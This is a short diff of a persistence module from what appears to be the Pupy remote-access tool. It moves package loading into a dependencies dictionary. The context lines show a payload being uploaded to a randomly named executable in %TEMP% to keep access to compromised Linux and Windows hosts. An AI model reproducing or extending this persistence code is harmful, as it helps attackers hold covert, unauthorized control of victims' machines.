@@ -27,6 +27,12 @@ __class_name__="PersistenceModule"
 @config(cat="manage", compat=['linux', 'windows'])
 class PersistenceModule(PupyModule):
     """ Enables persistence via registry keys """
+
+    dependencies = {
+        'linux': [ 'persistence' ],
+        'windows': [ 'pupwinutils.persistence' ]
+    }
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
         self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency', completer=path_completer)
@@ -38,7 +44,6 @@ class PersistenceModule(PupyModule):
             self.linux(args)
 
     def linux(self, args):
-        self.client.load_package('persistence')
         manager = self.client.conn.modules['persistence'].DropManager()
         self.info('Available methods: {}'.format(manager.methods))
         payload = get_payload(self, compressed=False)
@@ -65,7 +70,6 @@ class PersistenceModule(PupyModule):
             else:
                 exebuff=pupygen.get_edit_pupyx86_exe(self.client.get_conf())
 
-        self.client.load_package("pupwinutils.persistence")
         remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
         self.info("uploading to %s ..."%remote_path)
         #uploading
